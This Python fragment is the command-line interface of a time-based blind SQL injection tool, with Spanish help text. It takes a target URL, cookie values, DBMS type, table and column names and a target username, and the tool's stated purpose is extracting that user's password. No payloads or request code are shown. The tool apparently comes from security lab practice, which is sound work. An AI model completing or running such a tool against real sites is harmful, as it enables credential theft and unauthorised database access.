import argparse


#--------------CLI-----------------

def parse_args():
    parser = argparse.ArgumentParser(
        description="Blind SQLi — Time-Based — Optimized Extractor",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  python3 %(prog)s --url "https://..." --tracking "abc" --session "xyz"
  python3 %(prog)s --dbms postgresql --sleep 3
  python3 %(prog)s --dbms oracle --sleep 5 --threshold 4
        """,
    )
    parser.add_argument("--url",        help="URL objetivo")
    parser.add_argument("--tracking",   help="Valor de la cookie TrackingId")
    parser.add_argument("--session",    help="Valor de la cookie de sesión")
    parser.add_argument("--dbms",       help="auto | oracle | postgresql | mysql | mssql")
    parser.add_argument("--table",      help="Nombre de la tabla")
    parser.add_argument("--col-user",   help="Columna del nombre de usuario")
    parser.add_argument("--col-pass",   help="Columna del password")
    parser.add_argument("--user",       help="Usuario objetivo")
    parser.add_argument("--sleep",      help="Segundos de sleep (default 3)", type=int)
    parser.add_argument("--threshold",  help="Umbral en segundos (default auto)", type=float)
    parser.add_argument("--max-length", help="Longitud máxima del password", type=int)
    parser.add_argument("-q", "--quiet", help="Sin verbose", action="store_true")
    return parser.parse_args()


def apply_cli_args(args):

    global TARGET_URL, TRACKING_COOKIE_VALUE, EXTRA_COOKIES, DBMS
    global TABLE_NAME, USERNAME_COLUMN, PASSWORD_COLUMN, TARGET_USERNAME
    global SLEEP_TIME, THRESHOLD, REQUEST_TIMEOUT, MAX_PASSWORD_LENGTH, VERBOSE

    if args.url:        TARGET_URL = args.url
    if args.tracking:   TRACKING_COOKIE_VALUE = args.tracking
    if args.session:    EXTRA_COOKIES["session"] = args.session
    if args.dbms:       DBMS = args.dbms.lower()
    if args.table:      TABLE_NAME = args.table
    if args.col_user:   USERNAME_COLUMN = args.col_user
    if args.col_pass:   PASSWORD_COLUMN = args.col_pass
    if args.user:       TARGET_USERNAME = args.user
    if args.sleep:
        SLEEP_TIME = args.sleep
        REQUEST_TIMEOUT = SLEEP_TIME + 10
    if args.threshold:  THRESHOLD = args.threshold
    if args.max_length: MAX_PASSWORD_LENGTH = args.max_length
    if args.quiet:      VERBOSE = False




    